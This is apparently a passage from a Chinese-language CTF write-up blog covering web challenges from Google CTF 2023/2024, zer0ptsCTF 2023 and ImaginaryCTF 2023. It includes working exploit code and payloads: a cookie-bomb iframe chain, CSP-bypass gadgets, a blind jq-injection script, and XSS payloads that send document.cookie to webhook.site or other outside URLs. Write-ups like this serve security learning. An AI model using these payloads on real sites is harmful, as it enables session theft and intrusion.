=== 105) &#123; const result = handleLeak() let s = Array.from(new Set(result)) s = s.filter(item => &#123; if (item.indexOf('000') !== 40) &#123; return false &#125; return true &#125;) console.log('secret:', s) let i = 0 for(let f of s) &#123; console.log('try:', f, ++i) await getFlag(f.replace('000', '00000000')) &#125; &#125; res.send('ok') &#125;) app.get('/payload1', (req, res) => &#123; console.log('payload1') res.setHeader('Content-Type', 'text/css') res.send(payload1) &#125;) app.get('/payload2', (req, res) => &#123; console.log('payload2') res.setHeader('Content-Type', 'text/css') res.send(payload2) &#125;) app.get('/payload3', (req, res) => &#123; console.log('payload3') res.setHeader('Content-Type', 'text/css') res.send(payload3) &#125;) app.get('/payload', (req, res) => &#123; console.log('payload') let payload = `@import url(\"$&#123;BASE&#125;/payload1\");\\n@import url(\"$&#123;BASE&#125;/payload2\");\\n@import url(\"$&#123;BASE&#125;/payload3\");` res.setHeader('Content-Type', 'text/css') res.send(payload) &#125;) app.listen(port, async () => &#123; console.log(`Example app listening on port $&#123;port&#125;`) setTimeout(() => &#123; sendToBot(`&lt;style>@font-feature-values 'lol; @\\\\\\\\0069mport \"$&#123;BASE&#125;/payload\";p' &#123;&#125;&lt;/style>&lt;p class=\"p1\">&lt;/p>&lt;p class=\"p2\">&lt;/p>&lt;p class=\"p3\">&lt;/p>`) &#125;, 1000) &#125;) function sendToBot(payload) &#123; fetch('https://in-the-shadows-web.2024.ctfcompetition.com/share-with-admin?body=' + encodeURIComponent(payload)).then(r => r.text()).then(console.log) &#125;","link":"/2024/06/28/google-ctf-2024-writeup/"},{"title":"GoogleCTF + zer0ptsCTF + ImaginaryCTF 2023 筆記","text":"前陣子忙著旅遊，沒什麼時間在打 CTF，就算有打也有點懶得寫 writeup，導致上一篇 writeup 已經是 3 月份的時候了。覺得這樣斷掉其實有點可惜，就趕快再寫一篇補回來。 標題提到的這三個 CTF，我只有打 GoogleCTF 2023，其他兩場都只有稍微看一下題目而已，所以這篇也只是對題目以及解法做個筆記。 關鍵字列表： Flask 跟 PHP 解析 POST data 的順序不一致 iframe csp 阻止部分 script 載入 HEAD 繞 CSRF location.ancestorOrigins 拿 parent origin iframe 改 location 不會改到 src recaptcha URL 的 Angular CSP bypass gadget document.execCommand(‘undo’); 還原 input X-HTTP-Method-Override HTML 與 XHTML 的 parser 差異 GoogleCTF 2023這邊有官方給的完整題目內容跟解法：https://github.com/google/google-ctf/tree/master/2023 UNDER-CONSTRUCTION (466 solves)這題的核心程式碼如下： @authorized.route('/signup', methods=['POST']) def signup_post(): raw_request = request.get_data() username = request.form.get('username') password = request.form.get('password') tier = models.Tier(request.form.get('tier')) if(tier == models.Tier.GOLD): flash('GOLD tier only allowed for the CEO') return redirect(url_for('authorized.signup')) if(len(username) > 15 or len(username) &lt; 4): flash('Username length must be between 4 and 15') return redirect(url_for('authorized.signup')) user = models.User.query.filter_by(username=username).first() if user: flash('Username address already exists') return redirect(url_for('authorized.signup')) new_user = models.User(username=username, password=generate_password_hash(password, method='sha256'), tier=tier.name) db.session.add(new_user) db.session.commit() requests.post(f\"http://&#123;PHP_HOST&#125;:1337/account_migrator.php\", headers=&#123;\"token\": TOKEN, \"content-type\": request.headers.get(\"content-type\")&#125;, data=raw_request) return redirect(url_for('authorized.login')) 有一個註冊的功能，會檢查 data 中的參數，檢查完以後把 request forward 到 PHP 那邊，而我們的目標是建議一個 tier 為 GOLD 的使用者。 解法是利用 PHP 跟 Flask 對於 POST data 解析的不一致，如果傳 a=1&amp;a=2 的話，Flask 在拿 a 的時候會得到 1（第一個），而 PHP 會拿到 2（最後一個） 因此只要運用這個不一致，就可以在 Flask 那邊建立一個合法的使用者，但是 forward 給 PHP 的時候 tier 變成 GOLD： curl -X POST http:&#x2F;&#x2F;&lt;flask-challenge&gt;&#x2F;signup -d &quot;username&#x3D;username&amp;password&#x3D;password&amp;tier&#x3D;blue&amp;tier&#x3D;gold&quot; BIOHAZARD (14 solves)這題的功能是可以讓你建立一個 note，而目標是 XSS。 在 render note 的時候，有一個 prototype pollution 的洞，在 render 的時候會先 sanitized： goog.require('goog.dom'); goog.require('goog.dom.safe'); goog.require('goog.html.sanitizer.unsafe'); goog.require('goog.html.sanitizer.HtmlSanitizer.Builder'); goog.require('goog.string.Const'); window.addEventListener('DOMContentLoaded', () => &#123; var Const = goog.string.Const; var unsafe = goog.html.sanitizer.unsafe; var builder = new goog.html.sanitizer.HtmlSanitizer.Builder(); builder = unsafe.alsoAllowTags( Const.from('IFRAME is required for Youtube embed'), builder, ['IFRAME']); sanitizer = unsafe.alsoAllowAttributes( Const.from('iframe#src is required for Youtube embed'), builder, [ &#123; tagName: 'iframe', attributeName: 'src', policy: (s) => s.startsWith('https://') ? s : '', &#125; ]).build(); &#125;); setInnerHTML = function(elem, html) &#123; goog.dom.safe.setInnerHtml(elem, html); &#125; 而這個 sanitizer 可以藉由 prototype pollution 繞過部分限制，你不能用新的 tag，但可以繞過 attribute 的限制，例如說 iframe 原本就允許使用，因此你想用 iframe srcdoc 是可以的 有個麻煩的地方是 CSP 是 base-uri &#39;none&#39;; script-src &#39;nonce-$&#123;nonce&#125;&#39; &#39;strict-dynamic&#39; &#39;unsafe-eval&#39;; require-trusted-types-for &#39;script&#39;;，裡面有 trusted types，所以雖然你可以插入 &lt;img src=x onerror=alert(1)&gt;，但是背後的 sanitizer 在執行 img.setAttribute(&#39;onerror&#39;,&#39;alert(1)&#39;) 時就會觸發 trusted types 的錯誤，就掛了。 當初搞了很久都繞不過去，後來有個想法是其實 static 資料夾底下有一堆測試用的 HTML 檔案，如果裡面哪個有 XSS 漏洞的話，其實用個 iframe src 就可以 flag 了，當時有稍微找一下不過沒找到，賽後看到有人確實是用這個解的，用的是這個檔案：https://github.com/shhnjk/closure-library/blob/master/closure/goog/demos/xpc/minimal/index.html 再後來突然發現它載入 JS 是這樣： &lt;script src=\"/static/closure-library/closure/goog/base.js\" nonce=\"i8OeY0yF3xOOTZVZHHBqIg==\">&lt;/script> &lt;script src=\"/static/bootstrap.js\" nonce=\"i8OeY0yF3xOOTZVZHHBqIg==\">&lt;/script> &lt;script src=\"/static/sanitizer.js\" nonce=\"i8OeY0yF3xOOTZVZHHBqIg==\">&lt;/script> &lt;script src=\"/static/main.js\" nonce=\"i8OeY0yF3xOOTZVZHHBqIg==\">&lt;/script> 其中有個叫做 editor 的變數是定義在 bootstrap.js，然後會在 main.js 裡面作為 script src 載入腳本，如果我們用 iframe csp 擋住 bootstrap.js 的載入，然後再搭配污染 Object.prototype.editor，就可以載入任意 JS。 而這也確實是 intended solution。 當初是在 Intigriti’s November XSS challenge 學到這招的，把 CSP 變嚴格來阻止某些 script 的載入。 VEGGIE SODA (13 solves)這題賽中的時候隊友一個人把它解開了，完全沒看。 賽後看了一下官方解法，第一關是用 HEAD 來繞過 CSRF 的保護，這個好像也是滿常用的技巧，第二關看起來跟去年的 HORKOS 有點像，就一樣是 JS 反序列化的漏洞，找到 gadget chain 就可以利用然後拿到 XSS。 貼一下官方解法連結：https://github.com/google/google-ctf/tree/master/2023/web-vegsoda POSTVIEWER V2 (7 solves)其實就是這題讓我一直逃避寫 writeup，很像電影全面啟動（inception），一層又一層，複雜到我到後面都不知道自己在幹嘛了。 雖然叫做 V2，但其實本質跟去年的題目差滿多的。 先來看重點，重點在這一段： async function previewIframe(body, mimeType, shimUrl, container, sandbox = ['allow-scripts']) &#123; const url = new URL(shimUrl); url.host = `sbx-$&#123;generateRandomPart()&#125;.$&#123;url.host&#125;`; url.searchParams.set('o', window.origin); var iframe = document.createElement('iframe'); iframe.src = url; container.appendChild(iframe); iframe.addEventListener('load', () => &#123; iframe.contentWindow?.postMessage(&#123; body, mimeType, sandbox&#125;, url.origin); &#125;, &#123; once: true &#125;); &#125; 這邊會新增一個 random 的 sbx domain 的 iframe，然後把 flag 透過 postMessage 傳過去，而這個 sbx domain 的內容也很簡單： const TRUSTED_ORIGIN = new URL(location.href).searchParams.get('o'); if(!/^https?:\\/\\//.test(TRUSTED_ORIGIN)) &#123; throw new Error(\"Untrusted Origin\"); &#125;else&#123; const DEFAULT_STYLE = 'position:absolute; top:0; left:0; bottom:0; right:0; width:100vw; height:100vh; border:none; margin:0; padding:0; z-index:999999;' window.onmessage = (e) => &#123; const forbidden_sbx = /allow-same-origin/ig; if(e.origin !== TRUSTED_ORIGIN)&#123; throw new Error(\"Wrong origin\"); &#125; if (e.data.body === undefined || !e.data.mimeType) &#123; throw new Error(\"No content to render\"); &#125;; const blob = new Blob([e.data.body], &#123; type: e.data.mimeType &#125;); const iframe = document.createElement('iframe'); iframe.style.cssText = DEFAULT_STYLE; document.body.appendChild(iframe); iframe.setAttribute('sandbox', ''); if(e.data.sandbox)&#123; for(const value of e.data.sandbox)&#123; if(forbidden_sbx.test(value) || !iframe.sandbox.supports(value))&#123; console.error(`Unsupported value: $&#123;value&#125;`); continue; &#125; iframe.sandbox.add(value); &#125; &#125; iframe.src = URL.createObjectURL(blob); document.body.appendChild(iframe); window.onmessage = null; e.source.postMessage('blob loaded', e.origin); &#125;; &#125; 會把收到的內容變成 blob，然後再弄一個 sandbox iframe 放進去，而我們的目標是偷到這個 iframe 裡面的內容。 而最麻煩的點還有幾個： admin bot 有限制，這題不能新開視窗，任何跟 window.open 類似的功能都不能用 主 domain 的 CSP 是：frame-ancestors *.postviewer2-web.2023.ctfcompetition.com; frame-src *.postviewer2-web.2023.ctfcompetition.com sbx domain 的 CSP 是：frame-src blob: 首先呢，我們可以很輕鬆地拿到任何一個 sbx domain 的 XSS，像這樣： iframe = document.createElement(\"iframe\") url = new URL(\"https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html\"); url.searchParams.set('o', window.origin); iframe.src = url iframe.addEventListener('load', () => &#123; iframe.contentWindow.postMessage(&#123;body:\"&lt;script>alert(document.domain)&lt;/script>\", mimeType: \"text/html\", sandbox: [\"allow-modals\",\"allow-scripts\",[\"allow-same-origin\"],[\"allow-same-origin\"]]&#125;, \"*\") &#125;, &#123; once: true &#125;); document.body.appendChild(iframe); 好，問題來了，接下來可以做什麼？ 我們的第一步應該是要想辦法把主 domain 弄到 iframe 裡面去，才能做後續操作，但問題是 sbx domain 只允許嵌入 blob: 開頭的頁面，這怎麼辦呢？ 此時我們想到了可以利用 cookie bomb，把 sbx domain 弄成 HTTP/2 413 Request Entity Too Large，這樣的錯誤頁面就沒有了 CSP。 所以流程是： 先載入我們自己的網頁 嵌入一個 sbx iframe，拿到 XSS 從 sbx iframe 寫入 cookie，讓 &#x2F;bomb 路徑無法載入 再新增一個 iframe 是 &#x2F;bomb，這個頁面沒有 CSP 從第二步的 iframe 可以直接改寫第四步的 iframe 的內容，拿到一個沒有 CSP 的 XSS 接下來就可以在 iframe 裡面再嵌入 main domain 一直到第五步都是對的，但第六步是錯的，雖然現在沒了 frame-src blob: 的限制，但是 main domain 的 frame-ancestors *.postviewer2-web.2023.ctfcompetition.com; 是指所有的 parent page，所以只要我們的 top-level page 是自己的，就繞不過 CSP。 接著我突然想到可以利用 blob，像這樣： const blob = new Blob(['&lt;h1>hello&lt;/h1>&lt;iframe src=\"http://127.0.0.1:5000/test\">&lt;/iframe>'], &#123; type: 'text/html' &#125;); url = URL.createObjectURL(blob) console.log(url) location = url 這樣就可以讓 top-level domain 是 sbx-xxx.postviewer2-web.2023.ctfcompetition.com，符合了 CSP。 不過在嘗試的時候出現了錯誤： Unsafe attempt to initiate navigation for frame with origin ‘http://localhost:3000/‘ from frame with URL ‘blob:https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/a15c526d-a65b-45ba-b99f-293595eb8818‘. The frame attempting to navigate the top-level window is cross-origin and either it or one of its ancestors is not allowed to navigate the top frame. 後來隊友發現 iframe 補上 sandbox 就可以了：frame.sandbox = &#39;allow-modals allow-scripts allow-top-navigation allow-same-origin&#39;，這也是滿值得紀錄的一個行為，我以為沒有 sandbox 的權限會更大，沒想到加上 sandbox 才可以？ 所以這時候的流程就變成： 先載入我們自己的網頁 嵌入一個 sbx iframe(f1)，拿到 XSS 從 frame1 寫入 cookie，讓 &#x2F;bomb 路徑無法載入 再新增一個 iframe 是 &#x2F;bomb(f2)，這個頁面沒有 CSP 再新增一個 iframe f3 來執行操作 從 f3 改寫 f2 的 HTML，寫入的 script 會新增一個 blob html 然後改變 top.location 成功載入 blob 並且沒有任何 CSP 在 blob 頁面載入 main domain iframe 此時的 exploit 就已經 100 行了而且超複雜： &lt;body>&lt;/body> &lt;script> const sleep = ms => new Promise(r => setTimeout(r, ms)) function createBombFrame() &#123; let bombFrame = document.createElement(\"iframe\") url = new URL(\"https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html\"); url.searchParams.set('o', window.origin); bombFrame.src = url bombFrame.addEventListener('load', () => &#123; console.log('bombFrame created') bombFrame.contentWindow.postMessage(&#123; body: ` &lt;script> const domain = document.domain const cookieCount = 10 const cookieLength = 3000 const expireAfterMinute = 5 setCookieBomb() function setCookie(key, value) &#123; const expires = new Date(+new Date() + expireAfterMinute * 60 * 1000); const v = key + '=' + value + '; path=/bomb; domain=' + domain + '; Secure; SameSite=None; expires=' + expires.toUTCString() parent.document.cookie = v &#125; function setCookieBomb() &#123; const value = 'Boring' + '_'.repeat(cookieLength) for (let i=0; i&lt;cookieCount; i++) &#123; setCookie('key' + i, value); &#125; &#125; &lt;\\/script>`, mimeType: \"text/html\", sandbox: [\"allow-modals\", \"allow-scripts\", [\"allow-same-origin\"], [\"allow-same-origin\"]] &#125;, \"*\") &#125;, &#123; once: true &#125;); document.body.appendChild(bombFrame) &#125; function createBrokenFrame() &#123; return new Promise(resolve => &#123; let brokenFrame = document.createElement(\"iframe\") url = 'https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/bomb' brokenFrame.src = url brokenFrame.sandbox = 'allow-modals allow-scripts allow-top-navigation allow-same-origin' brokenFrame.addEventListener('load', () => &#123; console.log('brokenFrame loaded') resolve() &#125;, &#123; once: true &#125;); brokenFrame.addEventListener('error', (e) => &#123; console.log('brokenFrame error', e) resolve() &#125;, &#123; once: true &#125;); document.body.appendChild(brokenFrame) &#125;) &#125; function createXssFrame() &#123; console.log('createXssFrame') window.xssFrame = document.createElement(\"iframe\") url = new URL(\"https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html\"); url.searchParams.set('o', window.origin); xssFrame.src = url xssFrame.sandbox = 'allow-modals allow-scripts allow-top-navigation allow-same-origin' xssFrame.name = ` const blob = new Blob(['&lt;html>&lt;head>&lt;script src=\"YOUR PAYLOAD HERE\" />&lt;script>alert(1)&lt;/scr' + 'ipt>&lt;/head>&lt;body>&lt;div />&lt;/body>&lt;/html>'], &#123; type: 'text/html' &#125;); url = URL.createObjectURL(blob) console.log(url) window.top.location = url `; xssFrame.addEventListener('load', () => &#123; console.log('xss frame loaded') window.xssFrame.contentWindow.postMessage(&#123; body: ` &lt;script> top.frames[1].document.open() console.log('writing'); console.log('&lt;script>' + window.parent.name + '&lt;/scr' + 'ipt>'); top.frames[1].document.write('&lt;script>' + window.parent.name + '&lt;/scr' + 'ipt>') &lt;\\/script>`, mimeType: \"text/html\", sandbox: [\"allow-modals\", \"allow-scripts\", \"allow-top-navigation\", [\"allow-same-origin\"], [\"allow-same-origin\"]] &#125;, \"*\") &#125;, &#123; once: true &#125;); document.body.appendChild(xssFrame) &#125; async function main() &#123; createBombFrame() console.log(\"sleeping\") await sleep(2000) console.log(\"creating broken frame\") await createBrokenFrame() createXssFrame() &#125; window.addEventListener('message', e => &#123; console.log('got message', e, window.location.toString()); &#125;) window.addEventListener('load', () => &#123; main(); &#125;) &lt;/script> 重點是做這個多事情，就只是為了把 main domain 作為 iframe 載入，就這樣而已。 而再來就卡關了，原因是沒辦法繞過這一段： async function previewIframe(body, mimeType, shimUrl, container, sandbox = ['allow-scripts']) &#123; const url = new URL(shimUrl); url.host = `sbx-$&#123;generateRandomPart()&#125;.$&#123;url.host&#125;`; url.searchParams.set('o', window.origin); var iframe = document.createElement('iframe'); iframe.src = url; container.appendChild(iframe); iframe.addEventListener('load', () => &#123; iframe.contentWindow?.postMessage(&#123; body, mimeType, sandbox&#125;, url.origin); &#125;, &#123; once: true &#125;); &#125; 我們不知道那個 random domain 是什麼，所以沒辦法 postMessage，會被檢查擋住。如果能知道 random domain 的話就好辦了。 接著找了一堆 spec，看了 Chromium source code 跟 bug tracker，但還是沒什麼進展。最多就是找到這個：Issue 1359122: Security: SOP bypass leaks navigation history of iframe from other subdomain if location changed to about:blank，雖然就是我們要的但是已經修復了。 一直到比賽結束前十分鐘，隊友找到了 location.ancestorOrigins 這屬性，我才知道原來 child iframe 可以拿到 ancestor 的 origin，之前從來沒發現過（儘管它就在 location 的第一個屬性…） 時機限制的關係最後沒做出來，就差最後幾步而已了。 再來的步驟是把那個有 flag 的 blob iframe 導到我們準備好的 blob page，可以用 location.ancestorOrigins leak 出 sandbox domain： top[0][0][0].location = URL.createObjectURL(new Blob(['&lt;script>top.postMessage(location.ancestorOrigins[0],\"*\")&lt;\\/script>'], &#123; type: 'text/html' &#125;)); 再來我們知道了 sandbox domain 以後，就可以在這個 domain 上拿到 XSS，拿到了 XSS 以後，就可以存取 sandbox domain，此時雖然 iframe 的 location 已經變了，但是 iframe 的 src 不會換，所以可以直接拿到有 flag 的 blob src，拿到之後只要 fetch 就可以取得 flag： fetch(top[0][0].document.querySelector('iframe').src) 當初如果多個一兩個小時應該就可以做出來了，殘念。 最後附一下作者 exploit，滿值得學習的：https://github.com/google/google-ctf/blob/master/2023/web-postviewer2/solution/solve.html NOTENINJA (3 solves)這題基本上可以插入任意 HTML 但重點是 CSP：script-src &#39;self&#39; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; 原本以為這題用了 Next.js，會是跟之前 corCTF 2022 很像的做法，但試了很久都沒弄出來，賽後才知道原來這題就只是找到 recaptcha 的 CSP gadget… 在 recaptcha 網站裡面有個 angular 可以拿來當作 gadget，因此最後的解法是： ++++++++++++++++++++++++++++++++++++++ &lt;div ng-controller=\"CarouselController as c\" ng-init=\"c.init()\" > &amp;#91[c.element.ownerDocument.defaultView.parent.location=\"http://google.com?\"+c.element.ownerDocument.cookie]] &lt;div carousel>&lt;div slides>&lt;/div>&lt;/div> &lt;script src=\"https://www.google.com/recaptcha/about/js/main.min.js\">&lt;/script> ++++++++++++++++++++++++++++++++++++++ 也算是學到一個比較少人知道的 CSP bypass 了 然後有另一支隊伍直接找到了一個 Mongoose 的 0day：Mongoose Prototype Pollution Vulnerability in automattic&#x2F;mongoose 原因在程式碼的這一行：https://github.com/google/google-ctf/blob/master/2023/web-noteninja/challenge/src/pages/api/notes/%5Bid%5D.js#L74 await Note.findByIdAndUpdate(id, &#123; ...req.body, htmlDescription: htmlDescription &#125;); 直接把整個 body 吃進去，然後就可以透過 $rename 弄出一個 prototype pollution： import &#123; connect, model, Schema &#125; from 'mongoose'; await connect('mongodb://127.0.0.1:27017/exploit'); const Example = model('Example', new Schema(&#123; hello: String &#125;)); const example = await new Example(&#123; hello: 'world!' &#125;).save(); await Example.findByIdAndUpdate(example._id, &#123; $rename: &#123; hello: '__proto__.polluted' &#125; &#125;); // this is what causes the pollution await Example.find(); const test = &#123;&#125;; console.log(test.polluted); // world! console.log(Object.prototype); // [Object: null prototype] &#123; polluted: 'world!' &#125; process.exit(); 透過這個 prototype pollution 的洞，可以讓 find() dump 出所有的資料，就可以看到其他人的 note。 zer0ptsCTF 2023先補幾個 reference： zer0pts CTF writeup (in English) zer0pts CTF 2023 writeup (4 web challs) zer0pts CTF 2023 Writeups 每題的完整程式碼都在這裡：https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web Warmuprofile (48 solves)這題滿有趣的，你可以新增跟刪除使用者，目標是建立一個 admin user，但是 admin 已經存在了，所以要想辦法把它刪掉。 刪除的程式碼如下： app.post('/user/:username/delete', needAuth, async (req, res) => &#123; const &#123; username &#125; = req.params; const &#123; username: loggedInUsername &#125; = req.session; if (loggedInUsername !== 'admin' &amp;&amp; loggedInUsername !== username) &#123; flash(req, 'general user can only delete itself'); return res.redirect('/'); &#125; // find user to be deleted const user = await User.findOne(&#123; where: &#123; username &#125; &#125;); await User.destroy(&#123; where: &#123; ...user?.dataValues &#125; &#125;); // user is deleted, so session should be logged out req.session.destroy(); return res.redirect('/'); &#125;); 如果仔細看仔細想的話，會發現這邊有個問題。 那就是如果你同時開兩個 tab 登入，那兩個 session 的 username 都會有東西，接著在其中一個頁面刪除使用者，刪完以後另外一個也做相同操作。 此時 User.findOne 會因為資料庫裡面已經沒有這個使用者而回傳 null，執行到 User.destroy 時就會變成 where: &#123;&#125;，變成刪除資料庫裡面所有的東西，就可以把 admin 給刪掉。 jqi (40 solves)這題你設定條件以後會執行相對應的 jq 指令，我也是看到這題才發現原來 jq 這麼多功能。 最主要的程式碼是這一段： const KEYS = ['name', 'tags', 'author', 'flag']; fastify.get('/api/search', async (request, reply) => &#123; const keys = 'keys' in request.query ? request.query.keys.toString().split(',') : KEYS; const conds = 'conds' in request.query ? request.query.conds.toString().split(',') : []; if (keys.length > 10 || conds.length > 10) &#123; return reply.send(&#123; error: 'invalid key or cond' &#125;); &#125; // build query for selecting keys for (const key of keys) &#123; if (!KEYS.includes(key)) &#123; return reply.send(&#123; error: 'invalid key' &#125;); &#125; &#125; const keysQuery = keys.map(key => &#123; return `$&#123;key&#125;:.$&#123;key&#125;` &#125;).join(','); // build query for filtering results let condsQuery = ''; for (const cond of conds) &#123; const [str, key] = cond.split(' in '); if (!KEYS.includes(key)) &#123; return reply.send(&#123; error: 'invalid key' &#125;); &#125; // check if the query is trying to break string literal if (str.includes('\"') || str.includes('\\\\(')) &#123; return reply.send(&#123; error: 'hacking attempt detected' &#125;); &#125; condsQuery += `| select(.$&#123;key&#125; | contains(\"$&#123;str&#125;\"))`; &#125; let query = `[.challenges[] $&#123;condsQuery&#125; | &#123;$&#123;keysQuery&#125;&#125;]`; console.log('[+] keys:', keys); console.log('[+] conds:', conds); console.log(query) let result; try &#123; result = await jq.run(query, './data.json', &#123; output: 'json' &#125;); &#125; catch(e) &#123; console.log(e) return reply.send(&#123; error: 'something wrong' &#125;); &#125; if (conds.length > 0) &#123; reply.send(&#123; error: 'sorry, you cannot use filters in demo version' &#125;); &#125; else &#123; reply.send(result); &#125; &#125;); 雖然說有擋雙引號但沒擋 \\，因此只要兩個條件配合，就可以插入自己的 jq command，達成 command injection，用 env.FLAG 可以拿到 flag。 不過問題是不會把結果傳回來，所以是 blind injection，一個一個字元慢慢 leak 就行了，底下貼的是 zer0pts CTF 2023 writeup (4 web challs) 的 exploit： import httpx import string # BASE_URL = \"http://localhost:8300\" BASE_URL = \"http://jqi.2023.zer0pts.com:8300\" CHARS = \"&#125;_\" + string.ascii_letters + string.digits def make_str(xs: str) -> str: return \"(\" + \"+\".join([f\"([&#123;ord(x)&#125;] | implode)\" for x in xs]) + \")\" def is_ok(prefix: str) -> bool: res = httpx.get( f\"&#123;BASE_URL&#125;/api/search\", params=&#123; \"keys\": \"name\", \"conds\": \",\".join([ \"\\\\ in name\", f\"))] + [if (env.FLAG | startswith(&#123;make_str(prefix)&#125;)) then error(&#123;make_str('x')&#125;) else 0 end] # in name\" ]), &#125;, ) return res.json()[\"error\"] == \"something wrong\" known = \"zer0pts&#123;\" while not known.endswith(\"&#125;\"): for c in CHARS: if is_ok(known + c): known += c break print(known) print(\"Flag: \" + known) Neko Note (26 solves)又是一個經典 note app，核心程式碼如下： var linkPattern = regexp.MustCompile(`\\[([0-9a-f]&#123;8&#125;-[0-9a-f]&#123;4&#125;-4[0-9a-f]&#123;3&#125;-[0-9a-f]&#123;4&#125;-[0-9a-f]&#123;12&#125;)\\]`) // replace [(note ID)] to links func replaceLinks(note string) string &#123; return linkPattern.ReplaceAllStringFunc(note, func(s string) string &#123; id := strings.Trim(s, \"[]\") note, ok := notes[id] if !ok &#123; return s &#125; title := html.EscapeString(note.Title) return fmt.Sprintf( \"&lt;a href=/note/%s title=%s>%s&lt;/a>\", id, title, title, ) &#125;) &#125; // escape note to prevent XSS first, then replace newlines to &lt;br> and render links func renderNote(note string) string &#123; note = html.EscapeString(note) note = strings.ReplaceAll(note, \"\\n\", \"&lt;br>\") note = replaceLinks(note) return note &#125; sanitized 之後會 replace link，這邊雖然也有 escaped，但因為屬性沒有用引號包住所以可以注入任意屬性到 a 裡面。 這邊用 onanimationend 或是 onfocus 似乎都可以觸發 XSS。 這邊觸發 XSS 以後還有個步驟，那就是要偷的東西被刪掉了，但可以用神奇的 document.execCommand(&#39;undo&#39;); 將其復原。 ScoreShare (16 solves)這題的核心程式碼如下： @app.route(\"/\", methods=['GET', 'POST']) def upload(): if flask.request.method == 'POST': title = flask.request.form.get('title', '') abc = flask.request.form.get('abc', None) link = flask.request.form.get('link', '') if not title: flask.flash('Title is empty') elif not abc: flask.flash('ABC notation is empty') else: sid = os.urandom(16).hex() db().hset(sid, 'title', title) db().hset(sid, 'abc', abc) db().hset(sid, 'link', link) return flask.redirect(flask.url_for('score', sid=sid)) return flask.render_template(\"upload.html\") @app.route(\"/score/&lt;sid>\") def score(sid: str): \"\"\"Score viewer\"\"\" title = db().hget(sid, 'title') link = db().hget(sid, 'link') if link is None: flask.flash(\"Score not found\") return flask.redirect(flask.url_for('upload')) return flask.render_template(\"score.html\", sid=sid, link=link.decode(), title=title.decode()) @app.route(\"/api/score/&lt;sid>\") def api_score(sid: str): abc = db().hget(sid, 'abc') if abc is None: return flask.abort(404) else: return flask.Response(abc) 你可以新增一個 post 之類的，然後有個 unintended 是 /api/score/&lt;sid&gt; 這個 endpoint 會直接把 abc 整個吐出來，所以新增兩個，一個是 JS 內容，另一個是 &lt;script src=...&gt; 就可以直接 XSS 了。 預期解可以參考作者的文章：zer0pts CTF 2023 Writeup，透過 iframe DOM clobbering 再搭配原有的功能達成 prototype pollution，然後找到 ABCJS 的 gadget。 Ringtone (14 solves)這題有點小複雜，簡單記一下就好，就是可以透過 DOM clobbering 拿到一個在 Chrome extension context 的 XSS，接著用 chrome.history.search 可以拿到 flag URL，就可以去拿 flag。 作者 writeup：Ringtone Web Challenge Writeup - Zer0pts CTF 2023 Plain Blog (14 solves)這題是一個 blog app，你需要有拿 flag 的權限才能拿到 flag，而要有這個權限你的 post 必須有 1_000_000_000_000 以上的 like，但想也知道網站有擋 max like，根本湊不了這麼多。 解法是前端有個 prototype pollution 的洞，透過這個洞去污染 fetch 的參數，放入 X-HTTP-Method-Override: PUT 的 header，就可以讓 admin bot 直接去 call 另一隻 API 拿到權限。 ImaginaryCTF 2023Sanitized (5 solves)這題的程式碼滿簡短的，值得注意的就是 CSP 為 default-src &#39;self&#39;，然後 Express 那邊有個路徑是： app.use((req, res) => &#123; res.type('text').send(`Page $&#123;req.path&#125; not found`) &#125;) 看得出來需要利用這個路徑的 response 作為 script 來執行。 在前端的部分就是很經典的呼叫 DOMPurify： const params = new URLSearchParams(location.search) const html = params.get('html') if (html) &#123; document.getElementById('html').value = html document.getElementById('display').innerHTML = DOMPurify.sanitize(html) &#125; 在 index.xhtml 裡面載入 main.js 時，是採用相對路徑：&lt;script src=&quot;main.js&quot;&gt;&lt;/script&gt;。 我們先來看一下 unintended 的解法，滿有趣的。 非預期解是直接讓 bot 載入這個路徑：/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//asd%2f..%2f..%2findex.xhtml#https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750? 這是利用了 RPO（Relative Path Overwrite）來搞事，對後端來說 %2f 會被解析為 &#x2F;，所以這個 URl 就是在載入 index.xhtml，沒啥問題。 但是對瀏覽器來說，當前的路徑變為 1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//，因此會載入 /1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//main.js，而根據 Express 的 route，response 就會是： Page &#x2F;1;var[Page]&#x3D;[1];location&#x3D;location.hash.slice(1)+document.cookie&#x2F;&#x2F;main.js not found 第一句 Page/1 因為第二句的 var [Page]=[1] 的 hoisting 所以不會發生 variable is not defined 的錯誤，而最後的 main.js not found 被前面的 // 弄成註解，因此最後就執行了中間那一段，偷到了 cookie。 這操作真的帥氣。 Sanitized Revenge (3 solves)這題把 unintended 修掉了，讓我們來看一下預期解。 首先這題最重要的一點在於網頁是 xhtml，而非 html，因此瀏覽器的解析方式會不同。 舉例來說，作者給的 payload： &lt;div> &lt;div id=\"url\">https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?&lt;/div> &lt;style> &lt;![CDATA[&lt;/style>&lt;div data-x=\"]]＞&lt;/style>&lt;iframe name='Page' />&lt;base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' />&lt;style>&lt;!--\">&lt;/div>&lt;style>-->&lt;/style>&lt;/div> 會被 HTML parser 解析為 style tag + 一個含有 data-x 屬性的 div，所以 DOMPurify 不會做任何事情，這是沒問題的 HTML。 但由於現在在 xhtml 底下，因此 CDATA 那一段就變成了像是註解的東西，刪除後變成： &lt;div> &lt;div id=\"url\">https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?&lt;/div> &lt;style>&lt;/style> &lt;iframe name='Page' />&lt;base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' />&lt;style>&lt;!--\">&lt;/div>&lt;style>-->&lt;/style>&lt;/div> 原本在屬性裡的 iframe 跟 base 就跑了出來。 這邊會需要 base 是因為一般來說碰到 script-src &#39;self&#39; 這種 CSP，第一直覺一定是 &lt;iframe srcdoc&gt; 搭配 script gadget 去繞，但這題因為 xhtml 的限制在屬性中不能有&lt;，所以要利用之後會載入的 report.js 搭配 base 去改變路徑。 在作者 writeup 裡面還有給幾個其他人的解法，每個都滿有趣的。 